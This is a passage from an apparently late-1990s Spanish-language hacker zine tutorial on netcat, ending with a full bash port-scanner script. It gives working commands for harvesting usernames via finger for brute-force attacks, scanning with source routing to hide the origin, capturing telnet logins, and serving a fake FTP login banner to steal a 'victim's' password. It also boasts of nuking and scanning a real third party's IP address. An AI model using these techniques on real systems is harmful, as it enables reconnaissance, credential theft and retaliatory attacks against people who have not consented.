c:\>nc -v <IP> <puerto> (puedes a¤adir otra -v)


 Uno de los puertos m s interesantes a la Hora de Analizar un Host,  es
el  puerto  79  (Finger),  puedes  obtener  nombres  de   usuarios   e
informaci¢n  muy  £til  a  la hora de planear un "Brute-Force Attack",
este comandito  de  Netcat  te  muestra la Flexibilidad del Proggie en
cuesti¢n, d ndote una idea de sus posibilidades:

c:\>nc -v <host> 79 < user.txt > log.txt

 El comando anterior le dice a netcat que se conecte en modo verbose al
Host predeterminado en el puerto 79 (Finger) y env¡e el contenido  del
archivo  user.txt  (OJO:  no  he probado esto con una posible lista de
nombre de usuarios al azahar), la respuesta del servicio ser  guardada
en el archivo log.txt

Scanner:
========

 Netcat  puede  ser  utilizado como scanner, sus m£ltiples opciones  le
permiten realizar un gran n£mero de combinaciones,  pudiendo  realizar
Scannings en Puertos Random, en puertos conocidos, en modo  ascendente
o descendente,  con  intervalos  de  tiempo,  utilizando gateways para
evitar mostrar la IP fuente del Scanning, etc. 

 C:\nc11nt>nc -v -v -z 127.0.0.1 53 25 21

DNS fwd/rev mismatch: localhost != darkstar
localhost [127.0.0.1] 53 (domain): connection refused
localhost [127.0.0.1] 25 (smtp): connection refused
localhost [127.0.0.1] 21 (ftp): connection refused
sent 0, rcvd 0: NOTSOCK

 Pues si; aqui tienen  un  peque¤o y  primitivo scanner, se  le  pueden
a¤adir  puertos  escogidos  como en el ejemplo anterior o asignarle un
rango de puertos:

C:\nc11nt>nc -v -v -z 127.0.0.1 1-53

DNS fwd/rev mismatch: localhost != darkstar
localhost [127.0.0.1] 53 (domain): connection refused
localhost [127.0.0.1] 52 (?): connection refused
localhost [127.0.0.1] 51 (?): connection refused
localhost [127.0.0.1] 50 (?): connection refused
localhost [127.0.0.1] 49 (?): connection refused
localhost [127.0.0.1] 48 (?): connection refused  etc...

 Volvemos con la opci¢n -v (verbose) y la Opci¢n -z (zero i/o)  que  es
usada  para scanning, los puertos se lo especificamos al final del  IP
del host, bien  sea individuales separados por un  espacio; o  por  un
rango de puertos.
      

	Sniffer:
	========

 Otra  de  las interesante posibilidades de netcat es su capacidad para
escuchar  conexiones en cualquier puerto, pudiendo redireccionar  todo
el tr fico  del  mismo  hacia  un  archivo  o  hacia pantalla, en este
sencillo ejemplo, podemos observar las bases de un sencillo sniffer en
Windows:

C:\nc11nt>nc -v -v -L 127.0.0.1 -p 23

DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...
DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1131
login: sniffado
password: jeje!!
puedo ver todo lo que escriben aqui... Muuuaaahahahahahah!!! B-]


  Tambi‚n  podemos  redireccionar  toda la salida a un archivo e irnos a
  realizar otras actividades ,mientras netcat hace su trabajo:

C:\nc11nt>nc -v -v -L -p 23 127.0.0.1 -t >login.txt
DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...

[Aqui viene la conexi¢n...]

DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1030

[Todo lo que escriba la conexi¢n se va al archivo login.txt]
 sent 0, rcvd 42

[La opci¢n -L permite que netcat escuche nuevamente al terminar la
conexi¢n,"New Victims Wanted" Hehe!]

DNS fwd/rev mismatch: localhost != darkstar
listening on [127.0.0.1] 23 ...


El Exploit-Explained nc -v -v -L 127.0.0.1 -p 23
--------------------

 Ejecutamos a Netcat con la opci¢n o variable -v (verbose)  (doblemente
"verbose"  por si acaso) ;) esto har  que el resultado de netcat,  sea
mostrado  directamente en pantalla (a diferencia del archivo usado por
Dr._X),  la  opci¢n  o  variable -L  (Listen,  and  listen  again) nos
permitir   dejar  escuchando  u  "oliendo"  en  determinado puerto aun
cuando la conexi¢n sea interrumpida (listen again), con la variable -p
le indicamos el puerto...

  Al ejecutar a netcat con esa combinaci¢n de variables las opci¢n -v me
  indica en pantalla el Host y el puerto de escucha:

DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...


Realizo  desde  otra  ventana  un telnet a localhost (127.0.0.1) en el
puerto 23, netcat me informa sobre lo que ocurre en el puerto 23:

DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1131
login: sniffado


Voil ! un Sniffer en LocalHost!  Jajaja!!!


Detector de Conexiones Sospechosas
==================================

 La  posibilidad de dejar a netcat escuchando en determinados  puertos,
nos permite crear una especie de "trampa" para un supuesto agresor que
utilice scanners, o  herramientas  tales  como NetBus o BackOrifice en
contra de  nuestras  estaciones. Incluso, podemos crear un archivo que
haga un Flood y redireccionar su salida hacia la estaci¢n agresora  en
caso de una conexi¢n no  autorizada a  determinado puerto. (jeje! y se
me ocurren un mont¢n de cosas m s, Muaahahaha!)  :)

  Este  es  un ejemplo de un detector de BO, Je! y funciona! este es  un
  ejemplo real de un d¡a como cualquier otro en IRC; he aqu¡ el ejemplo:

C:\nc11nt>nc -u -v -v -L -p 31337 127.0.0.1 31337
DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 31337 ...

invalid connection to [0.0.0.0] from nas1-064.ras.bqm.cantv.net
[161.196.246.65]
 31338

 Back Orifice  utiliza  el  protocolo UDP para realizar sus travesuras,
realiza  la conexi¢n desde un puerto aleatorio (casi siempre  el 1080)
aunque en este caso lo hizo desde el 31338 (posiblemente una  variante
de BO),  por  eso se utiliza la opci¢n -u (protocolo udp),  netcat  se
queda  esperando  conexiones  UDP  en el puerto 31337 (default de BO),
cuando  alguien  hace  un  sweep  a tu IP netcat lo detecta enviando a
pantalla el IP y el DNS del agresor...

 Luego un peque¤o "Ping of Death" (Nuke) para el transgresor y le hacen
un Scan para ver cuando desaparece B-]

nas1-064.ras.bqm.cantv.net [161.196.246.65] 48 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 47 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 46 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 45 (?): TIMEDOUT
nas1-064.ras.bqm.cantv.net [161.196.246.65] 44 (?): TIMEDOUT<--Chao!!! Jeje!!


Otros usos Miscelaneos
======================

 Puedes  utilizar  algo  de  ingenier¡a  social para  capturar  algunos
passwords con netcat, por ejemplo, si una m quina no tiene abierto  el
puerto  de  FTP o de telnet, creas un archivo de texto que solicite el
ID y el Password de la v¡ctima; algo as¡:

Microsoft Internet FTP Server V.5.9 [Beta]
04/16/99 myhost.com
Please introduce Username, password and press "Enter"
LogOn:

Luego redireccionas el archivo hacia la v¡ctima:

C:\nc11nt>nc -v -v -L -p 21 nombre del host -t < login.txt

Si  el  tonto  cae... Ah¡  va  tu  password,  Jeje!! B-]  un  poco  de
imaginaci¢n  y  ma¤a  te  permitir n  encontrar muchas utilidades para
netcat.


Netcat en Vez de Telnet
=======================

 Yo personalmente prefiero usar netcat para realizar conexiones remotas
como  alternativa  al Telnet. la ventaja de realizar conexiones telnet
desde netcat es que este esconde "algo" sobre tu conexi¢n, lo  que  lo
hace mas "sigiloso" que telnet, (de ah¡ por  qu‚ lo  llamaron netcat),
Realizando una conexi¢n "Limpia" en determinado puerto,  obviando  las
negociaciones comunes  de  Telnet  que  pueden confundir al cliente en
determinados casos, como por ejemplo, al  utilizar  ciertas  Backdoors
muy conocidas en Unix.

 OJO:  algunas  m quinas interpretan al cliente de telnet y  asumen  el
nombre  del  usuario  que  lo  utiliza,  de  all¡  el  porqu‚  algunos
servidores solo preguntan por password ; te¢ricamente netcat  no env¡a
esta  informaci¢n.  Por eso,  es recomendable acostumbrarse a utilizar
netcat para hacer conexiones remotas:

 
	c:> nc -v nombre del host 23(o el puerto de tu preferencia)


Netcat y Programaci¢n
=====================

 Esta  combinaci¢n  desencadena  todo  el Poder de Netcat en su  m xima
expresi¢n; Trat ndose  de una  herramienta  que funciona con l¡neas de
comandos, su integraci¢n  con un  lenguaje de  programaci¢n le permite
realizar gran cantidad de tareas, y posibilidades se van  descubriendo
d¡a a d¡a con su inclusi¢n en nuevos Scripts y Exploits. 

 Muchos  ScriptKiddies  que  no tienen idea de lo que hacen, se sienten
frustrados porque muchos de los Scripts y Exploits que bajan de la Red 
simplemente no les  funciona, porque no saben  interpretar el C¢digo y
por lo  tanto son  incapaces de efectuar las modificaciones necesarias
para   incluir  librer¡as,  paths  o  utilidades  necesarias  para  su
funcionamiento. (J¢danse ScriptKiddies!!! Jajaja!!)

 Netcat  es  excelente  para  implementar exploits remotos, permitiendo
enviar el c¢digo a cualquier  puerto vulnerable con una  simple orden,
logrando  ejecutar   todos  los  comandos   necesarios  para  explotar
determinados servicios.

 Varios exploits que circulan actualmente en la Red, usan a netcat como
"motor" para  manejar las conexiones, si analizamos el c¢digo de estos
programas  podemos  observar  un  nc  por  ah¡, esto  significa que el
Proggie en cuesti¢n necesita una versi¢n  correctamente  compilada  de
netcat en el directorio  /usr/bin . A continuaci¢n un peque¤o programa
realizado por el Doctor_X de Hven utilizando a netcat:

<---------- Hven Port Scanner!! ------>

# !/bin/bash
# Scanner de Puertos 
# By DoctorX 17/04/99  email: d0ct0r_x@hven.com.ve
# Zona de Bacterias  http://bactery.8m.com
# Hackers de Venezuela http://www.hven.com.ve
# Este es un shell script hecho por mi para la verificaci¢n de 
# conexiones a un host utilizando netcat.

# Declaraci¢n de Variables

export NETCAT=" nc -v -v -w 8 -z "
export RANGO=$2
LOCALHOST=$(uname -n)
export PUERTOS="21 23 25 79 80 110 111 113 139 143 513 514 515 6000 31337"
export MEM1="Scanner de Puertos "
export MEM2="by "   
export MEM22="para Hackers Venezuela"
export MEM3="Victima : " 
export MEM4="Falta el GateWay para el Source Routing !!!!!!"
export MEM5="Te van a pillar !!!!!!! $USER jejejejeje "
export MEM6="Local Host : $LOCALHOST " 
export MEM7="UDP Scan "
export MEM8="http://www.hackhour.com.br/hven"
export re=" [5m"
export cl=" [0m"
export rojo=" [31m"
export email="email:d0ct0r_x@bactery.8m.com"

# Declaraci¢n de Funciones

# Mensaje cuando no se le dan Par metros

function mem() {
local uso="uso  :$0  [opcion]  <host> <gateway>"
local DRX="DoctorX"
echo $MEM1 
echo $MEM2   ${rojo}$DRX${cl}  $MEM22
echo $MEM8
echo ${rojo}$uso${cl} 
echo "<host>             :IP/HOSTNAME de La Victima jejejeje "
echo "<gateway>          :source-routing , es opcional " 
echo "opciones : "
echo "u                  :esta opcion de utiliza para hacer scan udp"
echo "so                 :Determinacion de SO de servidores Web" 
echo "r rango_de_puertos :Cambia el rango de puertos por defecto :plow-phi" &&
exit ; }

# Mensaje Inicial

function mem2() {
VICTIMA=$1
echo $MEM1
echo $MEM2 ${rojo}DoctorX${cl} $MEM22
echo $MEM3  $VICTIMA
echo $MEM6 ; }

# Mensaje 2

function mem_web() {
mem_web1="Hackers Venezuela"
mem_web2="By"
mem_web3="Victima : "
VICTIMA=$1
mem_web4="Determinacion de SO en Web Servers"
echo $mem_web1
echo $mem_web4
echo $mem_web2 ${rojo}DoctorX${cl} $email 
echo $mem_web3 $VICTIMA ;}


# Scan Tcp

function tcp() {
 HOST=$1
 $NETCAT  $HOST $PUERTOS ; }

# Scan Tcp con Rango

function tcp_rango() {
 HOST=$2
 RANGO=$1
 $NETCAT  $HOST $RANGO ; }

# Scan UDP

function udp() {  
VICTIMA=$1
echo $MEM7 
$NETCAT  -u $VICTIMA $PUERTOS ; }

# Scan UDP con gateway

function udp_gateway() {
echo $MEM7
VICTIMA=$2
GATE=$1
NETCAT_GATE="nc -v -v -z -u $VICTIMA -g $GATE " 
$NETCAT_GATE $PUERTOS ; }

# Scan con Source Routing
 
function tcp_gateway() {
GATE=$1
HOST=$2
RANGO=$PUERTOS
echo "Gate : $GATE "  
$NETCAT -g $GATE  $HOST $RANGO ; }

# Advertencia

function  adv() {
local MEM4="Falta el GateWay para el Source Routing !!!!!!"
local MEM5="Te van a pillar !!!!!!! $USER jejejejeje "
echo ${rojo}$MEM4${cl} 
echo ${re}${rojo}$MEM5${cl}  ; }

# Determinaci¢n de SO

function web_so() {
NC="nc -w "
HTTPPORT="80"
GET="GET /"
ECHO="/bin/echo"
HEAD="HEAD / HTPP/1.0"
HTTPVARIABLE="Server:"
WEB_SERVER="$1"
LOG="salida.txt"
#CHECKHTTP=( echo $GET  ; sleep 5)| $NETCAT $VICTIMA  80 
( echo $HEAD  ; echo ; echo ) | $NC  8 $WEB_SERVER $HTTPPORT | grep 
$HTTPVARIABLE  | cut -d: -f2  1> $LOG  
cat  $LOG
rm -f $LOG  ;}


# Seleccion de Opcion

case $# in 0 ) mem ;; 
           1 ) mem2 $1 ;
               adv  ;
               tcp $1 ;;
           3 ) if [ "$1" != "r" ]; then 
                  mem2 $2
                  udp_gateway $3 $2
               else {  mem2 $3
                     adv  
                     tcp_rango $2 $3 ;} 
               fi ;;
           2 ) if [ "$1" != "u" ] ; then
                       if [ "$1" != "so" ] ; then
                             {  mem2 $1
                             # adv  
                             tcp_gateway $2 $1 ;} 
                       else { mem_web $2
                              web_so $2 ;} 
                       fi
                else  { export HOST=$2
                       mem2 $HOST 
                       udp $2   
                       exit 0 ;}
                fi ;           
esac

 
<------- Fin del Hven-Scanner, cortar aqu¡ --------->

        Conclusi¢n
        ==========
	 
  Si  estudiamos  detalladamente  las  variables, el  misterio de netcat
  desaparece, viene la parte de la imaginaci¢n; ¨Que otras funciones  le
  podemos asignar? ¨Que mas podr¡a hacer? ; al revisar el  programa  que
  envi¢ Dr._X me dije: "L¢gico! Hmmm... Y que tal si hacemos as¡..."; el
  hacking  no  es  m s  que probar  nuevas  posibilidades, utilizando el
  ingenio, los  conocimientos  acumulados y una dosis bastante fuerte de
  imaginaci¢n podremos lograr lo que queramos.  :)


  Si tienes  otras ideas, utilidades, programas o forma innovadora  para
  utilizar  netcat, escr¡benos un  mail, estar‚ encantado de anexarlo en
  este documento....

  Este Documento fu‚ Realizado por Kliber, Agradecimientos especiales  a
  Doctor_X (Code Freak) :), DarKdEaTH, y a todos los miembros de nuestra
  comunidad por su invaluable Colaboraci¢n.

	"Hecho en Venezuela!"

Agradecemos a HVEN...
PortalHack Team
http://portalhack.cjb.net
---------------------------------------------------------[ph4-03.txt]--